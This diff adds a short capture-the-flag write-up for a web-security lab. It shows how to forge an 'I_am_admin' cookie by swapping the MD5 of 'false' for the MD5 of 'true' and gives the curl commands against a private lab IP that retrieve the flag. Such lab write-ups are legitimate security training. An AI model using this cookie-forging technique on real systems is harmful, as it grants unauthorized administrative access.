@@ -1,0 +1,5 @@
+Cookie flag:
+	simple take cookie from request: "I_am_admin=68934a3e9455fa72420237eb05902327", decode this 68934a3e9455fa72420237eb05902327 = 'false', after it take phrase 'true' and encrypt it with md5 = "b326b5062b2f0e69046810717534cb09", after it, need send request to the server, request looks like:
+	curl -v -H "Connection: close" --cookie="I_am_admin=b326b5062b2f0e69046810717534cb09" http://192.168.99.102 -o after.html
+	curl http://192.168.99.102 -o before.html
+	diff before.html after.html, and take the key
